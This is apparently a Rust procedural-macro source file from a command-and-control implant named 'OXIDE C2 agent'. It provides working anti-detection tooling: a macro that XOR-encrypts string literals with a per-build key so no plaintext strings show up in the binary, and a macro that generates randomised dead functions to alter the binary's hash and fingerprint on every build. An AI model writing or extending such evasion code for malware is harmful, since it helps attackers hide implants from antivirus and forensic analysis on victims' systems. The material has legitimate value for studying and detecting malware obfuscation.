//! Compile-time polymorphism macros for OXIDE C2 agent.
//!
//! # `encrypt_str!("literal")`
//! XOR-encrypts a string literal at compile time using a per-build key
//! injected by the agent's `build.rs` via the `OXIDE_CIPHER_KEY` env var.
//! At runtime, the generated code decrypts inline — no plaintext strings
//! appear in the binary or the LLVM IR.
//!
//! # `dead_code!(N)`
//! Emits N stub functions with randomised names and bodies derived from the
//! call site's file + line + column.  They are never called but change the
//! binary's hash and function-count fingerprint on every build.

use proc_macro::TokenStream;
use proc_macro2::{Span, TokenStream as TokenStream2};
use quote::quote;
use syn::{parse_macro_input, LitInt, LitStr};

// ── encrypt_str! ─────────────────────────────────────────────────────────────

#[proc_macro]
pub fn encrypt_str(input: TokenStream) -> TokenStream {
    let lit = parse_macro_input!(input as LitStr);
    let plaintext = lit.value();
    let bytes = plaintext.as_bytes();

    // Load the per-build key (hex-encoded 32 bytes) from OXIDE_CIPHER_KEY.
    // The agent's build.rs generates a fresh key each compilation.
    let key_hex = std::env::var("OXIDE_CIPHER_KEY")
        .unwrap_or_else(|_| "00".repeat(32));
    let key_bytes = hex_decode_or_zero(&key_hex, 32);

    // XOR-encrypt the plaintext bytes.
    let encrypted: Vec<u8> = bytes
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ key_bytes[i % key_bytes.len()])
        .collect();

    let len = encrypted.len();
    let enc_lit: Vec<_> = encrypted.iter().map(|&b| quote!(#b)).collect();
    let key_lit: Vec<_> = key_bytes.iter().map(|&b| quote!(#b)).collect();
    let key_len = key_bytes.len();

    // Emit inline decryption stub.
    let expanded = quote! {
        {
            static ENC: [u8; #len] = [#(#enc_lit),*];
            static KEY: [u8; #key_len] = [#(#key_lit),*];
            let mut buf = ENC;
            let mut i = 0usize;
            while i < #len {
                buf[i] ^= KEY[i % #key_len];
                i += 1;
            }
            String::from_utf8_lossy(&buf).into_owned()
        }
    };
    expanded.into()
}

// ── dead_code! ────────────────────────────────────────────────────────────────

#[proc_macro]
pub fn dead_code(input: TokenStream) -> TokenStream {
    let count = parse_macro_input!(input as LitInt)
        .base10_parse::<usize>()
        .unwrap_or(3)
        .min(32);

    // Use a simple hash of the proc-macro invocation span as a seed.
    // proc_macro2 Spans don't expose file/line stably at proc-macro time,
    // so we fall back to environment + count for determinism.
    let seed = env_seed() ^ (count as u64 * 0x9e3779b9);

    let mut fns = TokenStream2::new();
    for i in 0..count {
        let fn_name = format!("_dead_{:016x}", lcg_next(seed.wrapping_add(i as u64)));
        let ident = syn::Ident::new(&fn_name, Span::call_site());
        let magic = lcg_next(seed.wrapping_add(i as u64 + 1337));
        fns.extend(quote! {
            #[allow(dead_code)]
            #[inline(never)]
            fn #ident(x: u64) -> u64 {
                x.wrapping_mul(#magic).rotate_left(13).wrapping_add(0xDEADBEEF)
            }
        });
    }
    fns.into()
}

// ── helpers ───────────────────────────────────────────────────────────────────

fn hex_decode_or_zero(hex: &str, expected: usize) -> Vec<u8> {
    let decoded: Vec<u8> = hex
        .as_bytes()
        .chunks(2)
        .filter_map(|c| {
            let s = std::str::from_utf8(c).ok()?;
            u8::from_str_radix(s, 16).ok()
        })
        .collect();
    if decoded.len() == expected {
        decoded
    } else {
        vec![0u8; expected]
    }
}

fn env_seed() -> u64 {
    // Deterministic seed from OXIDE_CIPHER_KEY; changes every build.
    std::env::var("OXIDE_CIPHER_KEY")
        .unwrap_or_default()
        .bytes()
        .enumerate()
        .fold(0u64, |acc, (i, b)| {
            acc ^ (b as u64).wrapping_shl((i % 8) as u32).wrapping_mul(0x517cc1b727220a95)
        })
}

fn lcg_next(state: u64) -> u64 {
    state
        .wrapping_mul(6364136223846793005)
        .wrapping_add(1442695040888963407)
}
